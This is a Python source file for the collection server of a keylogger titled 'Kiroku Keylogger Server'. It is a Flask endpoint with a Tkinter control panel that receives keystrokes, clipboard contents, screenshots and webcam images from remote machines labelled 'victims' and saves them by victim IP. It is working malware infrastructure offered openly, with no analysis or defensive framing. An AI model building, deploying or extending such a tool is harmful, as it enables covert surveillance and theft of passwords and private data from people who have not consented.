import threading
import base64
import json
import logging
import os
from datetime import datetime
from flask import Flask, request, jsonify
import tkinter as tk
from tkinter import scrolledtext, ttk
from werkzeug.serving import make_server

# Flask app setup
app = Flask(__name__)

# Global variable to manage server state
server = None

# Configure logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# File paths and directories
keystrokes_file_path = 'saved_keystrokes.txt'
clipboard_file_path = 'saved_clipboard.txt'
screenshots_dir = 'screenshots'
camera_images_dir = 'camera_images'
connected_ips_file_path = 'connected_ips.txt'

os.makedirs(screenshots_dir, exist_ok=True)
os.makedirs(camera_images_dir, exist_ok=True)

# Flag for logging clipboard data, screenshot data, and camera images
show_clipboard_in_logs = True
show_screenshot_logs = True
show_camera_logs = True

connected_ips = set()

class GUIHandler(logging.Handler):
    def __init__(self, log_widget):
        super().__init__()
        self.log_widget = log_widget
        self.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.setLevel(logging.INFO)

    def emit(self, record):
        try:
            msg = self.format(record)
            level = record.levelname
            color = self.log_widget.tag_cget(level, "foreground")

            self.log_widget.insert(tk.END, msg + '\n', level)
            self.log_widget.yview(tk.END)
        except Exception:
            self.handleError(record)

class FilterFlaskLogs(logging.Filter):
    def filter(self, record):
        return not ("POST / HTTP/1.1" in record.getMessage())

@app.route('/', methods=['POST'])
def handle_post():
    try:
        post_data = request.data.decode('utf-8')
        data = json.loads(post_data)

        keyboard_data = data.get('keyboardData', '')
        clipboard_data = data.get('clipboardData', '')
        screenshot_base64 = data.get('screenshot', '')
        camera_image_base64 = data.get('cameraImage', '')

        victim_ip = request.remote_addr

        if victim_ip not in connected_ips:
            logger.info(f"{victim_ip} connected")
            connected_ips.add(victim_ip)

        if keyboard_data:
            logger.info(f"Received Keystrokes from {victim_ip}: {keyboard_data}")
            save_to_file(keystrokes_file_path, f"{victim_ip}: {keyboard_data}")

        if clipboard_data:
            save_to_file(clipboard_file_path, f"{victim_ip}: {clipboard_data}")
            if show_clipboard_in_logs:
                logger.info(f"Received Clipboard Data from {victim_ip}: {clipboard_data}")

        if screenshot_base64:
            save_screenshot(screenshot_base64, victim_ip)
            if show_screenshot_logs:
                logger.info(f"Screenshot saved from {victim_ip}")

        if camera_image_base64:
            save_camera_image(camera_image_base64, victim_ip)
            if show_camera_logs:
                logger.info(f"Camera image saved from {victim_ip}")

        return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200

    except json.JSONDecodeError as e:
        logger.error(f"JSON parsing error: {e}")
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

    except Exception as e:
        logger.error(f"Server error: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

def save_to_file(file_path, data):
    with open(file_path, 'a') as file:
        file.write(data + '\n')

def save_screenshot(base64_data, victim_ip):
    image_data = base64.b64decode(base64_data)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_name = f"{victim_ip}_screenshot_{timestamp}.png"
    file_path = os.path.join(screenshots_dir, file_name)
    with open(file_path, 'wb') as file:
        file.write(image_data)

def save_camera_image(base64_data, victim_ip):
    image_data = base64.b64decode(base64_data)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_name = f"{victim_ip}_camera_image_{timestamp}.png"
    file_path = os.path.join(camera_images_dir, file_name)
    with open(file_path, 'wb') as file:
        file.write(image_data)

def load_connected_ips():
    if os.path.exists(connected_ips_file_path):
        with open(connected_ips_file_path, 'r') as file:
            return set(line.strip() for line in file)
    return set()

def save_connected_ip(victim_ip):
    with open(connected_ips_file_path, 'a') as file:
        file.write(victim_ip + '\n')

def run_flask():
    global server
    server = make_server('0.0.0.0', 8080, app)
    server.serve_forever()

def stop_flask():
    global server
    if server:
        server.shutdown()
        server.server_close()
        server = None

class ServerGUI:
    def __init__(self, root):
        self.root = root
        root.title("Kiroku Keylogger Server")
        root.geometry("800x600")
        self.center_window(800, 600)

        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True)

        self.log_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.log_frame, text="Logs")

        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=90, height=30, wrap=tk.WORD, bg='black', fg='white')
        self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
        self.log_text.tag_configure("INFO", foreground="white")
        self.log_text.tag_configure("WARNING", foreground="orange")
        self.log_text.tag_configure("ERROR", foreground="red")

        self.gui_handler = GUIHandler(self.log_text)
        self.gui_handler.addFilter(FilterFlaskLogs())
        logger.addHandler(self.gui_handler)

        for handler in logger.handlers[:]:
            if isinstance(handler, logging.StreamHandler):
                logger.removeHandler(handler)

        self.control_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.control_frame, text="Control")

        self.start_button = ttk.Button(self.control_frame, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=10)

        self.stop_button = ttk.Button(self.control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.save_logs_button = ttk.Button(self.control_frame, text="Save Logs", command=self.save_logs)
        self.save_logs_button.pack(pady=10)

        self.clear_logs_button = ttk.Button(self.control_frame, text="Clear Logs", command=self.clear_logs)
        self.clear_logs_button.pack(pady=10)

        self.quit_button = ttk.Button(self.control_frame, text="Quit", command=self.quit_application)
        self.quit_button.pack(pady=10)

        self.clipboard_check = ttk.Checkbutton(self.control_frame, text="Show Clipboard in Logs", command=self.toggle_clipboard_logging)
        self.clipboard_check.pack(pady=10)
        self.clipboard_check.state(['selected'] if show_clipboard_in_logs else ['!selected'])

        self.screenshot_check = ttk.Checkbutton(self.control_frame, text="Show Screenshot Logs", command=self.toggle_screenshot_logging)
        self.screenshot_check.pack(pady=10)
        self.screenshot_check.state(['selected'] if show_screenshot_logs else ['!selected'])

        self.camera_check = ttk.Checkbutton(self.control_frame, text="Show Camera Logs", command=self.toggle_camera_logging)
        self.camera_check.pack(pady=10)
        self.camera_check.state(['selected'] if show_camera_logs else ['!selected'])

        ttk.Label(self.control_frame, text="Theme:").pack(pady=5)
        self.theme_combo = ttk.Combobox(self.control_frame, values=["Light", "Dark"], state="readonly")
        self.theme_combo.current(1)
        self.theme_combo.pack(pady=5)
        self.theme_combo.bind("<<ComboboxSelected>>", self.change_theme)

        ttk.Label(self.control_frame, text="Font Size:").pack(pady=5)
        self.font_size_spinbox = tk.Spinbox(self.control_frame, from_=8, to=30)
        self.font_size_spinbox.pack(pady=5)
        self.font_size_spinbox.bind("<Return>", self.change_font_size)

        self.server_thread = None
        self.server_running = False

        self.notebook.select(self.control_frame)

    def start_server(self):
        if not self.server_running:
            self.server_running = True
            self.server_thread = threading.Thread(target=run_flask, daemon=True)
            self.server_thread.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.log("Server started.")

    def stop_server(self):
        if self.server_running:
            stop_flask()
            self.server_running = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.log("Server stopped.")

    def save_logs(self):
        with open("logs.txt", "w") as log_file:
            log_file.write(self.log_text.get(1.0, tk.END))
        self.log("Logs saved to logs.txt.")

    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.log("Logs cleared.")

    def quit_application(self):
        self.stop_server()
        self.root.quit()

    def toggle_clipboard_logging(self):
        global show_clipboard_in_logs
        show_clipboard_in_logs = not show_clipboard_in_logs
        status = "enabled" if show_clipboard_in_logs else "disabled"
        self.log(f"Clipboard logging {status}.")
        self.clipboard_check.state(['selected'] if show_clipboard_in_logs else ['!selected'])

    def toggle_screenshot_logging(self):
        global show_screenshot_logs
        show_screenshot_logs = not show_screenshot_logs
        status = "enabled" if show_screenshot_logs else "disabled"
        self.log(f"Screenshot logging {status}.")

    def toggle_camera_logging(self):
        global show_camera_logs
        show_camera_logs = not show_camera_logs
        status = "enabled" if show_camera_logs else "disabled"
        self.log(f"Camera logging {status}.")

    def log(self, message):
        self.gui_handler.emit(logging.LogRecord(name='root', level=logging.INFO, pathname='', lineno=0, msg=message, args=None, exc_info=None))

    def center_window(self, width, height):
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x_cordinate = int((screen_width/2) - (width/2))
        y_cordinate = int((screen_height/2) - (height/2))
        self.root.geometry(f"{width}x{height}+{x_cordinate}+{y_cordinate}")

    def change_theme(self, event=None):
        selected_theme = self.theme_combo.get()
        if selected_theme == "Dark":
            self.root.configure(bg='black')
            self.log_text.configure(bg='black', fg='white')
            self.log_text.tag_configure("INFO", foreground="white")
        else:
            self.root.configure(bg='white')
            self.log_text.configure(bg='white', fg='black')
            self.log_text.tag_configure("INFO", foreground="black")

        self.log_text.tag_configure("WARNING", foreground="orange")
        self.log_text.tag_configure("ERROR", foreground="red")

        self.log(f"Theme changed to {selected_theme} mode.")

    def change_font_size(self, event=None):
        font_size = int(self.font_size_spinbox.get())
        self.log_text.configure(font=("TkDefaultFont", font_size))
        self.log(f"Font size changed to {font_size}.")

if __name__ == "__main__":
    root = tk.Tk()
    gui = ServerGUI(root)
    root.mainloop()
